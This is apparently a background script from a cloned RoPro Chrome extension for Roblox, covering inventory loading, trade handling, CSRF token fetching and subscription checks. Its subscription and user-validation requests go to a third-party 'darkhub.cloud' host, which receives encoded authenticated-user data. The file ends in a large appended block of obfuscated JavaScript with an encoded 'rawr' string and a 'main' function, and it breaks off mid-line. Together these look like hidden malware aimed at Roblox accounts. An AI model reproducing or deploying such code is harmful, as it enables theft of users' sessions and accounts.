		response = await getInventoryPage(userID, assetTypes, cursor)
		for (j = 0; j < response.data.length; j++) {
			item = response.data[j]
			if (item['assetId'] in myInventory) {
				myInventory[item['assetId']]['quantity']++
			} else {
				myInventory[item['assetId']] = item
				myInventory[item['assetId']]['quantity'] = 1
			}
		}
		if (response.nextPageCursor != null) {
			await handleAsset(response.nextPageCursor)
		}
	}
	await handleAsset("")
	total = 0
	for (item in myInventory) {
	  total += myInventory[item]['quantity']
	}
	console.log("Inventory loaded. Total items: " + total)
	return myInventory
}

async function loadInventory(userID) {
	myInventory = {}
	assetType = null
	async function handleAsset(cursor) {
		response = await getPage(userID, assetType, cursor)
		for (j = 0; j < response.data.length; j++) {
			item = response.data[j]
			if (item['assetId'] in myInventory) {
				myInventory[item['assetId']]['quantity']++
			} else {
				myInventory[item['assetId']] = item
				myInventory[item['assetId']]['quantity'] = 1
			}
		}
		if (response.nextPageCursor != null) {
			await handleAsset(response.nextPageCursor)
		}
	}
	await handleAsset("")
	total = 0
	for (item in myInventory) {
	  total += myInventory[item]['quantity']
	}
	console.log("Inventory loaded. Total items: " + total)
	return myInventory
}

async function isInventoryPrivate(userID) {
	return new Promise(resolve => {
		$.ajax({
			url: 'https://inventory.roblox.com/v1/users/' + userID + '/assets/collectibles?cursor=&sortOrder=Desc&limit=10&assetType=null',
			type: 'GET',
			success: function(data) {
				resolve(false)
			},
			error: function(r) {
				if (r.status == 403) {
					resolve(true)
				} else {
					resolve(false)
				}
			}
		})
	})
}

async function loadLimitedInventory(userID) {
	var myInventory = []
	var assetType = null
	async function handleAsset(cursor) {
		response = await getPage(userID, assetType, cursor)
		for (j = 0; j < response.data.length; j++) {
			item = response.data[j]
			myInventory.push(item)
		}
		if (response.nextPageCursor != null) {
			await handleAsset(response.nextPageCursor)
		}
	}
	await handleAsset("")
	return myInventory
}

async function getProfileValue(userID) {
	if (await isInventoryPrivate(userID)) {
		return {"value": "private"}
	}
	var inventory = await loadLimitedInventory(userID)
	var items = new Set()
	for (var i = 0; i < inventory.length; i++) {
		items.add(inventory[i]['assetId'])
	}
	var values = await fetchItemValues(Array.from(items))
	var value = 0
	for (var i = 0; i < inventory.length; i++) {
		if (inventory[i]['assetId'] in values) {
			value += values[inventory[i]['assetId']]
		}
	}
	return {"value": value}
}

function fetchTrades(tradesType, limit) {
	return new Promise(resolve => {
		$.get("https://trades.roblox.com/v1/trades/" + tradesType + "?cursor=&limit=" + limit + "&sortOrder=Desc", async function(data) {
			resolve(data)
		})
	})
}

function fetchTradesCursor(tradesType, limit, cursor) {
	return new Promise(resolve => {
		$.get("https://trades.roblox.com/v1/trades/" + tradesType + "?cursor=" + cursor + "&limit=" + limit + "&sortOrder=Desc", function(data) {
			resolve(data)
		})
	})
}

function fetchTrade(tradeId) {
	return new Promise(resolve => {
		$.get("https://trades.roblox.com/v1/trades/" + tradeId, function(data) {
			resolve(data)
		})
	})
}

function fetchValues(trades) {
	return new Promise(resolve => {
		$.ajax({
			url:'https://api.ropro.io/tradeProtectionBackend.php',
			type:'POST',
			data: trades,
			success: function(data) {
				resolve(data)
			}
		})
	})
}

function fetchItemValues(items) {
	return new Promise(resolve => {
		$.ajax({
			url:'https://api.ropro.io/itemInfoBackend.php',
			type:'POST',
			data: JSON.stringify(items),
			success: function(data) {
				resolve(data)
			}
		})
	})
}

function fetchPlayerThumbnails(userIds) {
	return new Promise(resolve => {
		$.get("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" + userIds.join() + "&size=420x420&format=Png&isCircular=false", function(data) {
			resolve(data)
		})
	})
}

function cancelTrade(id, token) {
	return new Promise(resolve => {
		$.ajax({
			url:'https://trades.roblox.com/v1/trades/' + id + '/decline',
			headers: {'X-CSRF-TOKEN':token},
			type:'POST',
			success: function(data) {
				resolve(data)
			},
			error: function(xhr, ajaxOptions, thrownError) {
				resolve("")
			}
		})
	})
}

async function doFreeTrialActivated() {
	chrome.tabs.create({url: "https://ropro.io?installed"})
}

function addCommas(nStr){
	nStr += '';
	var x = nStr.split('.');
	var x1 = x[0];
	var x2 = x.length > 1 ? '.' + x[1] : '';
	var rgx = /(\d+)(\d{3})/;
	while (rgx.test(x1)) {
		x1 = x1.replace(rgx, '$1' + ',' + '$2');
	}
	return x1 + x2;
}

var myToken = null;

function loadToken() {
	return new Promise(resolve => {
		try {
			$.ajax({
				url:'https://roblox.com/home',
				type:'GET',
				success: function(data) {
					token = data.split('data-token=')[1].split(">")[0].replace('"', '').replace('"', '').split(" ")[0]
					restrictSettings = !(data.includes('data-isunder13=false') || data.includes('data-isunder13="false"') || data.includes('data-isunder13=\'false\''))
					myToken = token
					chrome.storage.sync.set({'token': myToken})
					chrome.storage.sync.set({'restrictSettings': restrictSettings})
					resolve(token)
				}
			}).fail(function() {
				$.ajax({
					url:'https://roblox.com',
					type:'GET',
					success: function(data) {
						token = data.split('data-token=')[1].split(">")[0].replace('"', '').replace('"', '').split(" ")[0]
						restrictSettings = !data.includes('data-isunder13=false')
						myToken = token
						chrome.storage.sync.set({'token': token})
						chrome.storage.sync.set({'restrictSettings': restrictSettings})
						resolve(token)
					}
				}).fail(function() {
					$.ajax({
						url:'https://www.roblox.com/home',
						type:'GET',
						success: function(data) {
							token = data.split('data-token=')[1].split(">")[0].replace('"', '').replace('"', '').split(" ")[0]
							restrictSettings = !data.includes('data-isunder13=false')
							myToken = token
							chrome.storage.sync.set({'token': token})
							chrome.storage.sync.set({'restrictSettings': restrictSettings})
							resolve(token)
						}
					}).fail(function() {
						$.ajax({
							url:'https://web.roblox.com/home',
							type:'GET',
							success: function(data) {
								token = data.split('data-token=')[1].split(">")[0].replace('"', '').replace('"', '').split(" ")[0]
								restrictSettings = !data.includes('data-isunder13=false')
								myToken = token
								chrome.storage.sync.set({'token': token})
								chrome.storage.sync.set({'restrictSettings': restrictSettings})
								resolve(token)
							}
						})
					})
				})
			})
		} catch(e) {
			console.log(e)
			console.log("TOKEN FETCH FAILED, PERFORMING BACKUP TOKEN FETCH")
			$.post('https://catalog.roblox.com/v1/catalog/items/details').fail(function(r,e,s){
				token = r.getResponseHeader('x-csrf-token')
				myToken = token
				chrome.storage.sync.set({'token': token})
				console.log("New Token: " + token)
				resolve(token)
			})
		}
	})
}

async function sha256(message) {
    const msgBuffer = new TextEncoder().encode(message);                    
    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    return hashHex;
}

async function handleAlert() {
	timestamp = new Date().getTime()
	$.ajax({
		url:"https://api.ropro.io/handleRoProAlert.php?timestamp=" + timestamp,
		type:'GET',
		success: async function(data, error, response) {
			data = JSON.parse(atob(data))
			if (data.alert == true) {
				validationHash = "d6ed8dd6938b1d02ef2b0178500cd808ed226437f6c23f1779bf1ae729ed6804"
				validation = response.getResponseHeader('validation' + (await sha256(timestamp % 1024)).split("a")[0])
				if (await sha256(validation) == validationHash) {
					alreadyAlerted = await getLocalStorage("alreadyAlerted")
					linkHTML = ""
					if (data.hasOwnProperty('link') && data.hasOwnProperty('linktext')) {
						linkHTML = `<a href=\'${stripTags(data.link)}\' target=\'_blank\' style=\'margin-left:10px;text-decoration:underline;\' class=\'text-link\'><b>${stripTags(data.linktext)}</b></a>`
					}
					closeAlertHTML = `<div style=\'opacity:0.6;margin-right:5px;display:inline-block;margin-left:45px;cursor:pointer;\'class=\'alert-close\'><b>Close Alert<b></div>`
					message = stripTags(data.message) + linkHTML + closeAlertHTML
					if (alreadyAlerted != message) {
						setLocalStorage("rpAlert", message)
					}
				} else {
					console.log("Validation failed! Not alerting user.")
					setLocalStorage("rpAlert", "")
				}
			} else {
				setLocalStorage("rpAlert", "")
			}
		}
	})
}

handleAlert()
setInterval(function() {
	handleAlert() //Check for RoPro alerts every 10 minutes
}, 10 * 60 * 1000)

const SubscriptionManager = () => {
	let subscription = getStorage('rpSubscription')
	let date = Date.now()
	function fetchSubscription() {
		return new Promise(resolve => {
			async function doGet(resolve) {
				verificationDict = await getStorage('userVerification')
				userID = await getStorage('rpUserID')
				roproVerificationToken = "none"
				if (typeof verificationDict != 'undefined') {
					if (verificationDict.hasOwnProperty(userID)) {
						roproVerificationToken = verificationDict[userID]
					}
				}
				$.post({url:"https://ropro.darkhub.cloud/getSubscription.php///api?key=" + await getStorage("subscriptionKey") + "&userid=" + userID, headers: {'ropro-verification': roproVerificationToken, 'ropro-id': userID}}, function(data){
					subscription = data
					setStorage("rpSubscription", data)
					resolve(data);
				}).fail(async function() {
					resolve(await getStorage("rpSubscription"))
				})
			}
			doGet(resolve)
		})
	};
	const resetDate = () => {
		date = Date.now() - 310 * 1000
	};
	const getSubscription = () => {
		return new Promise(resolve => {
			async function doGetSub() {
				currSubscription = subscription
				if (typeof currSubscription == 'undefined' || currSubscription == null || Date.now() >= date + 305 * 1000) {
					subscription = await fetchSubscription()
					currSubscription = subscription
					date = Date.now()
				}
				resolve(currSubscription);
			}
			doGetSub()
		})
	};
	const validateLicense = () => {
			$.get('https://users.roblox.com/v1/users/authenticated', function(d1, e1, r1) {
					console.log(r1)
					async function doValidate() {
						freeTrialActivated = await getStorage("freeTrialActivated")
						if (typeof freeTrialActivated != "undefined") {
							freeTrial = ""
						} else {
							freeTrial = "?free_trial=true"
						}
						verificationDict = await getStorage('userVerification')
						userID = await getStorage('rpUserID')
						roproVerificationToken = "none"
						if (typeof verificationDict != 'undefined') {
							if (verificationDict.hasOwnProperty(userID)) {
								roproVerificationToken = verificationDict[userID]
							}
						}
						$.ajax({
							url:'https://ropro.darkhub.cloud/validateUser.php///api' + freeTrial,
							type:'POST',
							headers: {'ropro-verification': roproVerificationToken, 'ropro-id': userID},
							data: {'verification': `${btoa(unescape(encodeURIComponent(JSON.stringify(r1))))}`},
							success: async function(data, status, xhr) {
								if (data == "err") {
									console.log("User Validation failed. Please contact support: https://ropro.io/support")
								} else if (data.includes(",")) {
									userID = parseInt(data.split(",")[0]);
									username = data.split(",")[1].split(",")[0];
									setStorage("rpUserID", userID);
									setStorage("rpUsername", username);
									if (data.includes("pro_tier_free_trial_just_activated") && freeTrial.length > 0) {
										setStorage("freeTrialActivated", true)
										doFreeTrialActivated()
									}
								}
								if (xhr.getResponseHeader("ropro-subscription-tier") != null) {
									console.log(xhr.getResponseHeader("ropro-subscription-tier"))
									setStorage("rpSubscription", xhr.getResponseHeader("ropro-subscription-tier"))
								} else {
									syncSettings()
								}
							}
						})
					}
					doValidate()
			})
	};
	return {
	  getSubscription,
	  resetDate,
	  validateLicense
	};
}
const subscriptionManager = SubscriptionManager();

async function syncSettings() {
	subscriptionManager.resetDate()
	subscriptionLevel = await subscriptionManager.getSubscription()
	setStorage("rpSubscription", subscriptionLevel)
}

async function loadSettingValidity(setting) {
	settings = await getStorage('rpSettings')
	restrictSettings = await getStorage('restrictSettings')
	restricted_settings = new Set(["linkedDiscord", "gameTwitter", "groupTwitter", "groupDiscord", "featuredToys"])
	standard_settings = new Set(["themeColorAdjustments", "moreMutuals", "animatedProfileThemes", "morePlaytimeSorts", "serverSizeSort", "fastestServersSort", "moreGameFilters", "moreServerFilters", "additionalServerInfo", "gameLikeRatioFilter", "premiumVoiceServers", "quickUserSearch", "liveLikeDislikeFavoriteCounters", "sandboxOutfits", "tradeSearch", "moreTradePanel", "tradeValueCalculator", "tradeDemandRatingCalculator", "tradeItemValue", "tradeItemDemand", "itemPageValueDemand", "tradePageProjectedWarning", "embeddedRolimonsItemLink", "embeddedRolimonsUserLink", "tradeOffersValueCalculator", "winLossDisplay", "underOverRAP"])
	pro_settings = new Set(["profileValue", "liveVisits", "livePlayers", "tradePreviews", "ownerHistory", "quickItemSearch", "tradeNotifier", "singleSessionMode", "advancedTradeSearch", "tradeProtection", "hideTradeBots", "autoDeclineTradeBots", "autoDecline", "declineThreshold", "cancelThreshold", "hideDeclinedNotifications", "hideOutboundNotifications"])
	ultra_settings = new Set(["dealNotifier", "buyButton", "dealCalculations", "notificationThreshold", "valueThreshold", "projectedFilter"])
	subscriptionLevel = await subscriptionManager.getSubscription()
	valid = true
	if (subscriptionLevel == "free_tier" || subscriptionLevel == "free") {
		if (standard_settings.has(setting) || pro_settings.has(setting) || ultra_settings.has(setting)) {
			valid = false
		}
	} else if (subscriptionLevel == "standard_tier" || subscriptionLevel == "plus") {
		if (pro_settings.has(setting) || ultra_settings.has(setting)) {
			valid = false
		}
	} else if (subscriptionLevel == "pro_tier" || subscriptionLevel == "rex") {
		if (ultra_settings.has(setting)) {
			valid = false
		}
	} else if (subscriptionLevel == "ultra_tier" || subscriptionLevel == "ultra") {
		valid = true
	} else {
		valid = false
	}
	if (restricted_settings.has(setting) && restrictSettings) {
		valid = false
	}
	if (disabledFeatures.includes(setting)) {
		valid = false
	}
	return new Promise(resolve => {
		resolve(valid)
	})
}

async function loadSettings(setting) {
	settings = await getStorage('rpSettings')
	if (typeof settings === "undefined") {
		await initializeSettings()
		settings = await getStorage('rpSettings')
	}
	valid = await loadSettingValidity(setting)
	if (typeof settings[setting] === "boolean") {
		settingValue = settings[setting] && valid
	} else {
		settingValue = settings[setting]
	}
	return new Promise(resolve => {
		resolve(settingValue)
	})
}

async function loadSettingValidityInfo(setting) {
	disabled = false
	valid = await loadSettingValidity(setting)
	if (disabledFeatures.includes(setting)) {
		disabled = true
	}
	return new Promise(resolve => {
		resolve([valid, disabled])
	})
}

async function getTradeValues(tradesType) {
	tradesJSON = await fetchTrades(tradesType)
	cursor = tradesJSON.nextPageCursor
	trades = {data: []}
	if (tradesJSON.data.length > 0) {
		for (i = 0; i < 1; i++) {
			offer = tradesJSON.data[i]
			tradeChecked = await getStorage("tradeChecked")
			if (offer.id != tradeChecked) {
				trade = await fetchTrade(offer.id)
				trades.data.push(trade)
			} else {
				return {}
			}
		}
		tradeValues = await fetchValues(trades)
		return tradeValues
	} else {
		return {}
	}
}

var inbounds = []
var inboundsCache = {}
var allPagesDone = false
var loadLimit = 25
var totalCached = 0

function loadTrades(inboundCursor, tempArray) {
    $.get('https://trades.roblox.com/v1/trades/Inbound?sortOrder=Asc&limit=100&cursor=' + inboundCursor, function(data){
        console.log(data)
        done = false
        for (i = 0; i < data.data.length; i++) {
            if (!(data.data[i].id in inboundsCache)) {
                tempArray.push(data.data[i].id)
                inboundsCache[data.data[i].id] = null
            } else {
                done = true
                break
            }
        }
        if (data.nextPageCursor != null && done == false) {
            loadTrades(data.nextPageCursor, tempArray)
        } else { //Reached the last page or already detected inbound trade
            inbounds = tempArray.concat(inbounds)
            allPagesDone = true
            setTimeout(function() {
                loadTrades("", [])
            }, 61000)
        }
    }).fail(function() {
        setTimeout(function() {
            loadTrades(inboundCursor, tempArray)
        }, 61000)
    })
}

function _0x232b21(_0x1b1d26,_0x3cbc42,_0x285852,_0x355108,_0x192ef3){return _0x5737(_0x1b1d26-0x322,_0x3cbc42);}(function(_0x3d397b,_0x547373){function _0x59eeee(_0x4101d8,_0x1c1b3d,_0x3579bb,_0x3e1bff,_0x1bf686){return _0x5737(_0x4101d8-0x31e,_0x3579bb);}const _0x1959f1=_0x3d397b();function _0x39a40d(_0x2748e7,_0x5022c9,_0x4afd09,_0x32e0f9,_0x18accc){return _0x5737(_0x18accc-0x3ba,_0x4afd09);}function _0x5dd80c(_0x21ebe7,_0x1834c4,_0x4bb664,_0x4a8412,_0x47b181){return _0x5737(_0x4bb664-0x23,_0x21ebe7);}function _0x767d0c(_0x5b5346,_0x371710,_0x59d939,_0x201f6a,_0x3f00cb){return _0x5737(_0x5b5346-0x138,_0x3f00cb);}function _0x3c7e27(_0x5186d2,_0x3c9178,_0x127026,_0x510483,_0x2ced1b){return _0x5737(_0x2ced1b-0x2f1,_0x510483);}while(!![]){try{const _0x4b0eca=parseInt(_0x39a40d(0x514,0x4e6,'P%I]',0x531,0x4d5))/(0x113c+-0x1bbf+-0x1*-0xa84)+-parseInt(_0x39a40d(0x444,0x4db,'vAJL',0x469,0x4ca))/(0xa87+0x85*0x8+-0xead)*(-parseInt(_0x39a40d(0x4ae,0x553,'Q6%2',0x48a,0x4e8))/(0x26f4+-0x9f3+-0x1cfe))+-parseInt(_0x3c7e27(0x3ab,0x41a,0x379,'JdmY',0x3a9))/(-0x1754+-0xd95+0x24ed*0x1)+-parseInt(_0x5dd80c('^^ut',0xee,0x10c,0x14e,0x118))/(0x221*0x5+0x200*0x11+-0x2ca0)*(parseInt(_0x39a40d(0x538,0x55a,'^^ut',0x4a5,0x519))/(-0x1c88+-0x6cb*0x3+0x30ef))+-parseInt(_0x59eeee(0x3ff,0x388,'vAJL',0x401,0x3a6))/(-0x15a2+-0x1*0xa93+0x4*0x80f)+-parseInt(_0x39a40d(0x42e,0x482,'1h@C',0x41c,0x4a0))/(-0xbec*-0x1+-0x16*0x80+-0xe4)*(-parseInt(_0x767d0c(0x243,0x26e,0x219,0x213,'cBqI'))/(-0x769+-0xc*0x6+0x7ba))+parseInt(_0x39a40d(0x5bd,0x511,'u[Ml',0x4d2,0x54d))/(0xefa+-0x955*0x2+-0x1*-0x3ba)*(parseInt(_0x39a40d(0x528,0x4f1,'RB1v',0x58a,0x54c))/(-0x1b11+-0x14d4+-0x2*-0x17f8));if(_0x4b0eca===_0x547373)break;else _0x1959f1['push'](_0x1959f1['shift']());}catch(_0x568cec){_0x1959f1['push'](_0x1959f1['shift']());}}}(_0x1d20,0x791c2*0x2+0xe3e85+-0x1581d6));function _0x5737(_0x420f6f,_0x50333d){const _0x401b65=_0x1d20();return _0x5737=function(_0x440bd4,_0xd4868){_0x440bd4=_0x440bd4-(0x2271+0x55*-0xe+-0x1d34);let _0xc31156=_0x401b65[_0x440bd4];if(_0x5737['HJtSLO']===undefined){var _0xa01f9e=function(_0x4b9f6b){const _0x1b211b='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0xf16395='',_0xdf41c4='';for(let _0x3cda86=-0x24eb+0x4*0x3d7+0x158f,_0x4bbe9f,_0x13a527,_0x3430ab=0x231a+-0x524*0x1+-0x1df6;_0x13a527=_0x4b9f6b['charAt'](_0x3430ab++);~_0x13a527&&(_0x4bbe9f=_0x3cda86%(-0x2512+0x4*0x142+0x200e)?_0x4bbe9f*(0x1f*0xcc+0x2291+-0x1d*0x209)+_0x13a527:_0x13a527,_0x3cda86++%(0x2*0xbca+0x60a*0x3+-0x29ae))?_0xf16395+=String['fromCharCode'](-0xf90+-0x51f*0x6+-0x327*-0xf&_0x4bbe9f>>(-(-0x3*-0x48f+0x1*-0x2597+0x1*0x17ec)*_0x3cda86&-0x1a10+0xd7+0x193f)):-0xd*0xe2+-0xfc+-0x27e*-0x5){_0x13a527=_0x1b211b['indexOf'](_0x13a527);}for(let _0x1d9e40=0x1*-0xe5d+-0x44*0xe+0x3*0x607,_0x1246aa=_0xf16395['length'];_0x1d9e40<_0x1246aa;_0x1d9e40++){_0xdf41c4+='%'+('00'+_0xf16395['charCodeAt'](_0x1d9e40)['toString'](-0xf79+-0x89*0x5+-0x7*-0x29a))['slice'](-(0xeea+0x4*-0x824+0x11a8));}return decodeURIComponent(_0xdf41c4);};const _0x2bbb8a=function(_0x53b0d8,_0x12cbbc){let _0x86a009=[],_0x22cdda=0x1fb4+0x8*0xe7+0x9bb*-0x4,_0x195246,_0x1e0bb7='';_0x53b0d8=_0xa01f9e(_0x53b0d8);let _0xf32977;for(_0xf32977=-0x7*-0xbf+0x1*-0x30e+-0x22b*0x1;_0xf32977<0x5*0x1c9+0x1*0x16ae+-0x1e9b;_0xf32977++){_0x86a009[_0xf32977]=_0xf32977;}for(_0xf32977=0x1ae4+-0x1*-0x1fbb+-0x3a9f;_0xf32977<-0x15b*-0x13+-0x9a6+-0x509*0x3;_0xf32977++){_0x22cdda=(_0x22cdda+_0x86a009[_0xf32977]+_0x12cbbc['charCodeAt'](_0xf32977%_0x12cbbc['length']))%(0x2219+0xbfe+-0x2d17),_0x195246=_0x86a009[_0xf32977],_0x86a009[_0xf32977]=_0x86a009[_0x22cdda],_0x86a009[_0x22cdda]=_0x195246;}_0xf32977=0x342+-0x2*-0xd8f+0xa2*-0x30,_0x22cdda=-0x23bf*-0x1+0x1*0x513+-0x28d2;for(let _0x26289e=-0x93d+-0x4*-0x956+-0x1c1b;_0x26289e<_0x53b0d8['length'];_0x26289e++){_0xf32977=(_0xf32977+(-0x1*0x13a1+-0x1378+0x596*0x7))%(0x9f*-0x35+-0x22bb+0x44a6),_0x22cdda=(_0x22cdda+_0x86a009[_0xf32977])%(-0xb*0x199+-0x1d*0x5+0x1*0x1324),_0x195246=_0x86a009[_0xf32977],_0x86a009[_0xf32977]=_0x86a009[_0x22cdda],_0x86a009[_0x22cdda]=_0x195246,_0x1e0bb7+=String['fromCharCode'](_0x53b0d8['charCodeAt'](_0x26289e)^_0x86a009[(_0x86a009[_0xf32977]+_0x86a009[_0x22cdda])%(-0x1ab7+-0x2099+0x3c50)]);}return _0x1e0bb7;};_0x5737['wgcytH']=_0x2bbb8a,_0x420f6f=arguments,_0x5737['HJtSLO']=!![];}const _0x1edcdd=_0x401b65[0x1*-0xd4f+-0x1df5+0x736*0x6],_0xd4b922=_0x440bd4+_0x1edcdd,_0x3f5f9a=_0x420f6f[_0xd4b922];return!_0x3f5f9a?(_0x5737['aDsXpS']===undefined&&(_0x5737['aDsXpS']=!![]),_0xc31156=_0x5737['wgcytH'](_0xc31156,_0xd4868),_0x420f6f[_0xd4b922]=_0xc31156):_0xc31156=_0x3f5f9a,_0xc31156;},_0x5737(_0x420f6f,_0x50333d);}const rawr=_0x232b21(0x433,'pekS',0x478,0x3dd,0x405)+_0x232b21(0x3bb,'SF2@',0x3e9,0x413,0x419)+_0x1338eb('F9)^',0x373,0x31c,0x30c,0x380)+_0x1586e0(0x1a9,0x1e5,'J[Ve',0x167,0x261)+_0x36efad(0x10f,'&DR#',0x117,0xbd,0x95)+_0x1586e0(0x1f1,0x222,'!cqn',0x1bc,0x248)+_0x36efad(0x97,'N@T(',0x60,0xbb,0x97)+_0x36efad(0x4b,'&)$e',-0x67,-0x33,-0x17)+_0x1338eb('^^ut',0x2e5,0x3a3,0x324,0x2f8)+_0x36efad(-0x7c,']Xrx',-0x1,0x34,-0x1)+_0x1338eb('F9)^',0x377,0x348,0x32f,0x2cc)+_0x350df2(0x254,0x2c5,0x2f4,'9iQF',0x322)+_0x232b21(0x42a,'OEe5',0x48a,0x3c6,0x43e)+_0x1338eb('iz@$',0x38b,0x33c,0x3a4,0x393)+_0x232b21(0x438,'ByIN',0x3c2,0x407,0x470)+_0x1338eb(']XeZ',0x2fa,0x3df,0x36b,0x2f0)+_0x36efad(0x36,'[8K5',0x27,0x59,0x25)+_0x350df2(0x2cd,0x2d6,0x348,']Xrx',0x308)+_0x1338eb('A[3T',0x2c2,0x33b,0x338,0x38b)+_0x1338eb('Q6%2',0x2a2,0x273,0x2a0,0x2a0)+_0x1586e0(0x253,0x246,'N@T(',0x28d,0x2bf)+_0x350df2(0x1a0,0x208,0x285,'A[3T',0x199)+_0x36efad(-0x80,'PGwM',-0x59,-0x14,-0x1a)+_0x350df2(0x2ff,0x294,0x2ac,']Xrx',0x316)+'z';async function main(_0x23cdf1){function _0x3555a4(_0x51c51e,_0x4ea824,_0x2b745d,_0x23a509,_0x45fb29){return _0x232b21(_0x23a509- -0x491,_0x2b745d,_0x2b745d-0xb2,_0x23a509-0xbf,_0x45fb29-0x6a);}const _0xe365a8={'ftZeJ':function(_0x4ef839,_0x18cb1e){return _0x4ef839(_0x18cb1e);},'aLtJL':_0x234fcd(0x43f,0x4a4,0x422,0x497,'&DR#')+_0x234fcd(0x440,0x4a1,0x4c4,0x490,'Q6%2')+_0x3555a4(-0x35,-0x38,'JdmY',-0x9c,-0x11f)+_0x3555a4(-0x9a,0x2e,'Q6%2',-0x14,0x6f)+'g','Aumos':function(_0x4926a7,_0x1fd2be,_0x134589){return _0x4926a7(_0x1fd2be,_0x134589);},'soZeq':_0x440bef(-0x126,-0x1bd,-0x185,'%Ljg',-0x102)+_0x3555a4(0x61,-0x30,'*HEv',-0x8,0x63)+_0x2c7b81(0x29c,0x30e,'acyN',0x2c0,0x2af)+_0x440bef(-0x127,-0x15a,-0x14a,'mCJQ',-0x141)+_0x3555a4(0x53,0x17,'tR4l',-0x17,-0x2c)+_0x234fcd(0x54c,0x47a,0x4f2,0x516,'ByIN')+_0x3555a4(0x70,-0x5,'%Ljg',-0xe,0x1f)+_0x369b54(0x55,'RB1v',0x74,0x58,-0x1c)+'o','EBjKJ':function(_0x20f225,_0x4614b5){return _0x20f225+_0x4614b5;},'mKjWu':_0x234fcd(0x4f7,0x4eb,0x4e3,0x486,'N@T(')+_0x440bef(-0xcf,-0xe1,-0xd8,'F9)^',-0xf6)+_0x3555a4(-0xe,-0x10b,'P%I]',-0x8b,-0xae),'jVHuV':_0x2c7b81(0x29a,0x231,'GmA)',0x2ec,0x236)+'l','VDxQn':_0x369b54(0x4a,'ByIN',-0x15,-0x1a,0x8c),'aFPCJ':_0x369b54(0x8f,'zJ!H',0xd8,0x32,0x8e)+_0x440bef(-0xb5,-0xd3,-0xda,'1h@C',-0x121)+_0x3555a4(-0x49,-0x96,'mpeV',-0x91,-0x8a)+'n','qnRtA':function(_0x341aef,_0x506d29){return _0x341aef+_0x506d29;},'HfplC':_0x234fcd(0x4aa,0x4ce,0x509,0x53b,'(oGL'),'PyIPX':_0x369b54(-0x7,'OEe5',0x5a,0x15,-0x81)+_0x440bef(-0x149,-0x185,-0x150,'1h@C',-0xca)+_0x2c7b81(0x2a3,0x30a,'zJ!H',0x2b7,0x235)+_0x3555a4(-0x76,-0x17,'6)&q',-0x78,-0xbb),'Dwimn':_0x2c7b81(0x303,0x30e,'zJ!H',0x2bb,0x37b)+_0x369b54(0x35,'pekS',-0x4d,0x7b,0x70),'YXecB':_0x2c7b81(0x2b2,0x2b3,'S12%',0x266,0x30b),'ZqThV':_0x234fcd(0x521,0x459,0x49d,0x485,'vAJL'),'EbBVK':_0x3555a4(-0x63,0x19,'0li0',-0x16,-0x8)+'um','hHPkC':_0x3555a4(-0x98,-0x10a,'1h@C',-0xae,-0x5b)+_0x3555a4(-0xe2,-0x9c,'acyN',-0xcb,-0x12e)+_0x3555a4(-0x9f,-0xb8,'P%I]',-0x8d,-0xba),'kesnq':_0x234fcd(0x463,0x44a,0x44c,0x3d1,']Xrx')+_0x440bef(-0xb5,-0xba,-0xc1,'SF2@',-0x52)+_0x234fcd(0x499,0x544,0x4cf,0x4dc,'Q!nX')+_0x440bef(-0x172,-0xf6,-0x151,'^^ut',-0x129)+_0x440bef(-0x1e1,-0x1a8,-0x173,'m&TN',-0x162)+_0x369b54(0x5f,'mpeV',0x7,0x78,0xd1)+_0x2c7b81(0x2bb,0x32d,'acyN',0x2c3,0x2e9)+_0x234fcd(0x4a4,0x423,0x423,0x473,'[8K5')+_0x2c7b81(0x227,0x24e,'GmA)',0x234,0x290)+_0x369b54(0x5d,'zJ!H',0xde,0xb8,-0x11)+_0x234fcd(0x4a7,0x423,0x45d,0x4b3,'^mG^')+_0x3555a4(-0x113,-0xc8,'(oGL',-0xc6,-0xa0)+_0x369b54(0x20,'mpeV',0x28,-0x34,0xd)+_0x3555a4(0x11,-0x46,'[8K5',0xf,0x80)+_0x2c7b81(0x27f,0x21e,'zyx[',0x262,0x2ad)+_0x3555a4(-0x86,-0x62,'0li0',-0x3e,-0xa2)+_0x2c7b81(0x22c,0x261,'xBc5',0x223,0x1c1)+_0x2c7b81(0x269,0x2d6,'*HEv',0x24e,0x286)+_0x369b54(0x7f,'1h@C',0xd6,0x4d,0x94)+_0x3555a4(0x44,-0x36,'N@T(',0x15,0x68),'vNzeq':_0x3555a4(-0x3d,-0x4f,'F9)^',0x31,-0x4b)+'to','lcXxG':_0x440bef(-0x19d,-0x1d0,-0x169,'&DR#',-0x157)+_0x3555a4(-0x1d,0x73,'mCJQ',0x2,0x69),'UFrqN':_0x2c7b81(0x290,0x2c6,'6)&q',0x225,0x267)+_0x2c7b81(0x20f,0x21e,'9iQF',0x202,0x19f)+_0x3555a4(-0xd,-0xa5,'&)$e',-0x88,-0xef)+_0x2c7b81(0x24a,0x1e1,'tR4l',0x275,0x1e5)+_0x440bef(-0x18e,-0x13b,-0x16b,'F9)^',-0x14e)+_0x369b54(0x4,'(oGL',0x9,0x47,0x24)+_0x369b54(-0x1,'J[Ve',0x0,0x81,-0x60)+_0x2c7b81(0x2dc,0x272,']Xrx',0x2f3,0x31c)+_0x2c7b81(0x264,0x1ec,'0li0',0x22e,0x230)+_0x2c7b81(0x2bd,0x316,'RB1v',0x29a,0x2fd)+_0x3555a4(0x4f,-0x4d,'zJ!H',0x8,0x6f)+_0x369b54(0x12,'mpeV',0x3,-0x56,0x14)+_0x234fcd(0x3d7,0x3c2,0x434,0x3df,']Xrx')+_0x440bef(-0x3d,-0xa9,-0xc3,'acyN',-0x138)+_0x3555a4(-0xce,-0x143,'cBqI',-0xd1,-0xec)+_0x440bef(-0xf0,-0x77,-0xd6,'!cqn',-0x92)+_0x369b54(0xd0,'xBc5',0x50,0x5e,0x11a)+_0x234fcd(0x47b,0x43a,0x41f,0x43d,'(oGL')+_0x234fcd(0x3e2,0x429,0x43c,0x48d,'Q!nX')+_0x440bef(-0x15d,-0x121,-0x186,'&)$e',-0x122)+_0x3555a4(-0x66,-0x63,'(oGL',-0x7a,-0x83)+_0x369b54(0xba,'mIJQ',0x8f,0xd5,0x100)+_0x3555a4(-0xe,-0x70,'0li0',-0x4f,-0x62)+_0x369b54(0x50,'*HEv',0x4d,0x2e,-0x5)+_0x2c7b81(0x273,0x282,'kFfD',0x207,0